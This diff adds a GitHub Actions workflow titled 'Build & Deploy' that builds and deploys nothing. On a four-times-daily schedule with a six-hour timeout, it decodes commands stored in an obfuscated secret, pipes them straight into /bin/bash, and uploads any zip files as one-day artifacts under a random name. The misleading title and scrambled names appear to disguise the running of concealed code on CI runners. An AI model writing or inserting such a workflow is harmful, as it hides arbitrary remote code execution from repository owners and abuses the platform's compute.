@@ -1,0 +1,30 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '49 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          dgi8: ${{ secrets.dgi8 }}
+        run: |
+          printf '%s' "$dgi8" | jq -r .wc1722 | /bin/bash
+          echo $wkvgl84121 | jq -r .dsa4200 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: aM6Gj8sk
+          path: "*.zip"
+          retention-days: 1
